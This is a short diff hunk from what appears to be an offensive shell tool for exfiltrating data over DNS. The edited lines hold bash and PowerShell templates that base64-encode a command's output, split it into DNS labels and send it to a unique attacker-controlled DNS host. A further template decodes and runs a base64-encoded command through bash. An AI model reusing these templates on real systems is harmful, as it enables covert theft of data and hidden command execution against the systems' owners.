@@ -191,7 +191,7 @@ printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\
 #bash_cmd="(${cmd})|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -P %THREADS% -n %NLABELS% bash -c 'IFS=.;echo %dns_trigger% \"\$*\".%STAGE_ID%%UNIQUE_DNS_HOST%' bash"
 
 #since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach
-#powershell_cmd=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).split("(.{1,%LABEL_SIZExNLABELS%})")|?{$_}|%{%dns_trigger% $("{0}{1}" -f $_.replace("(.{1,%LABEL_SIZE%})",'$1.'),"%UNIQUE_DNS_HOST%")}
+#powershell_cmd=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).replace("+","-1").replace("/","-2").replace("=","-3") -split "(.{1,%LABEL_SIZExNLABELS%})"|?{$_}|%{%dns_trigger% $("{0}{1}" -f ($_ -replace "(.{1,%LABEL_SIZE%})",'$1.'),"%UNIQUE_DNS_HOST%")}
 
 ##########bash definitions#######
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
